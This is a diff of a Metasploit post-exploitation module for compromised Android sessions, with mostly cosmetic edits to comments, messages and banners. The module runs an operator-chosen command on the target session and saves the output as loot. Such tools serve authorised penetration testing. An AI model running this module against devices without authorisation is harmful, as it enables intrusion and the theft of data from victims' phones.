@@ -48,11 +48,9 @@
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
 # 1 - service postgresql start
-# 2 - msfdb reinit   (importante - required)
-# 3 - msfconsole -q -x 'db_status; reload_all'
+# 2 - msfdb reinit   (important - required)
+# 3 - msfconsole -x 'db_status; reload_all'
 ##
-
-
 
 
 
@@ -128,21 +126,22 @@ class MetasploitModule < Msf::Post
         end
 
 
+
 #
 # The 'def run()' funtion ..
 # Running sellected modules against session target.
 #
 def run
 
-  session = client
   #
   # Variable declarations (msf API calls)
   #
+  session = client
   sysnfo = session.sys.config.sysinfo
   runtor = client.sys.config.getuid
   runsession = client.session_host
   directory = client.fs.dir.pwd
-  build_prop = get_build_prop # android version release
+  build_prop = get_build_prop  # Grab android version release
   #
   # draw module banner ..
   #
@@ -197,23 +196,23 @@ def run
       exec_comm = datastore['EXEC_COMMAND']
         # check if exec_command option its configurated ..
         unless exec_comm.nil?
-          print_good("Executing: #{exec_comm}")
+          print_status("Executing: #{exec_comm}")
           Rex::sleep(0.5)
           # bash command to be executed remotely ..
           single_comm = cmd_exec("#{exec_comm}")
             # print data on screen
-            print_line("************************************")
+            print_line("***************************************")
             print_line(single_comm)
-            print_line("************************************")
+            print_line("***************************************")
             Rex::sleep(0.2)
           #
           # store data into a local variable (data_dump) ..
-          # to be able to write the logfile
+          # to be able to write the logfile later.
           #
           data_dump = []
-          data_dump << "************************************\n"
+          data_dump << "***************************************\n"
           data_dump << "Executing: #{exec_comm}\n"
-          data_dump << "************************************\n"
+          data_dump << "***************************************\n"
           data_dump << single_comm
           data_dump << "\n\n"
         end
@@ -234,7 +233,7 @@ def run
             File.open("#{loot_folder}/android_#{rand}.txt", "w") do |f|
             f.write("#{data_dump}")
             f.close
-            print_status("Logfile: #{loot_folder}/android_#{rand}.txt")
+            print_good("Logfile: #{loot_folder}/android_#{rand}.txt")
           else
             print_error("[ABORT]: Options not configurated correctly!")
             print_warning("Please set LOOT_FOLDER <full path>")
@@ -242,11 +241,8 @@ def run
       end
 
 
-   #
    # end of the 'def run()' funtion ..
-   #
    end
-#
+
 # exit module execution (_EOF) ..
-#
 end
